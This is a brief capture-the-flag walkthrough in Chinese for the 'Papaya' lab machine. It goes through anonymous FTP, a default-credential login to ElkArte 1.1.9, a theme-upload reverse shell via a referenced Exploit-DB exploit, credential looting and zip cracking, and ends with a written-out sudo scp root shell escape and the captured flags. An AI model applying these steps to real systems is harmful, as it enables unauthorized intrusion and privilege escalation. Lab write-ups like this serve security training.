# Papaya

2025.03.03 https://thehackerslabs.com/papaya/

[video]()

## Ip

192.168.5.39

## Scan

```
PORT   STATE SERVICE
21/tcp open  ftp
22/tcp open  ssh
80/tcp open  http
```

ftp 匿名登陆得到 secret.txt : ndhvabunlanqnpbñb

将 papaya.thl 添加到 hosts 文件，在访问主页，底部 ElkArte 1.1.9 ，尝试使用该 cms 的默认凭据进行登陆: admin:password

这里可以上传文件从而获得反弹 shell https://www.exploit-db.com/exploits/52026 添加新的 Theme

访问 http://papaya.thl/themes/8888/8888.php 获得反弹 shell。

发现数据库配置数据：

```
www-data@papaya:/var/www/html/elkarte$ cat Settings.php

$db_name = 'elkarte';
$db_user = 'elkarte';
$db_passwd = 'password';
```

在 /opt 中发现 pass.zip 有密码，john 爆出密码 jesica ， zip 解压后得到 papayarica 是 papaya 用户的密码，ssh 登陆到这个用户。

拿到 user flag：

```
papaya@papaya:~$ cat user.txt
c84145316c7a5f4574fe34e5164c3c83
```

sudo 显示 (root) NOPASSWD: /usr/bin/scp 进行提权：

```
TF=$(mktemp);echo 'sh 0<&2 1>&2' > $TF;chmod +x "$TF"
sudo scp -S $TF x y:
```

拿到 root flag：

```
# id
uid=0(root) gid=0(root) grupos=0(root)
# cd /root
# ls
root.txt
# cat root.txt
da4ac5feea7ff4ac9f3e0d842d76e271
```
